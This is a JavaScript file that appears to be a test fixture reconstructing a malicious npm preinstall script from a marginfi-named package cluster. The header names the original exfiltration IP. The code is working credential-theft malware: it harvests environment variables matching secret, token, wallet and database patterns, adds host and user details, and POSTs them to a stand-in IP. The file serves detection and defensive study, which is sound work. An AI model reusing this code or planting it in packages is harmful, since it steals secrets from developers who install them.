// Reconstruction of the marginfi/mrgn-* cluster preinstall.js, mai 2026.
// Pattern from data/all-review-results.json (marginfi-client-v2@999.0.0):
//   - env var harvest filtered by KEY|SECRET|TOKEN|PASSWORD|PRIVATE|WALLET|
//     MNEMONIC|SEED|RPC|DATABASE|REDIS|MONGO|ELASTIC|API
//   - direct IP+custom port exfil (no DNS)
//   - includes hostname/user/cwd context
// The original posted to 72.62.71.201:18443/npm-exfil. This reconstruction
// targets a non-routable test endpoint to keep the fixture inert.
const https = require('https');
const http = require('http');
const os = require('os');

const SECRET_REGEX = /KEY|SECRET|TOKEN|PASSWORD|PRIVATE|WALLET|MNEMONIC|SEED|RPC|DATABASE|REDIS|MONGO|ELASTIC|API/i;

const env = {};
for (const k of Object.keys(process.env)) {
  if (SECRET_REGEX.test(k)) env[k] = process.env[k];
}

const payload = {
  host: os.hostname(),
  user: os.userInfo().username,
  cwd: process.cwd(),
  env: env,
};

const body = JSON.stringify(payload);
const req = http.request({
  host: '203.0.113.42',
  port: 18443,
  path: '/npm-exfil',
  method: 'POST',
  headers: { 'Content-Type': 'application/json', 'Content-Length': body.length }
}, () => {});
req.on('error', () => {});
req.write(body);
req.end();
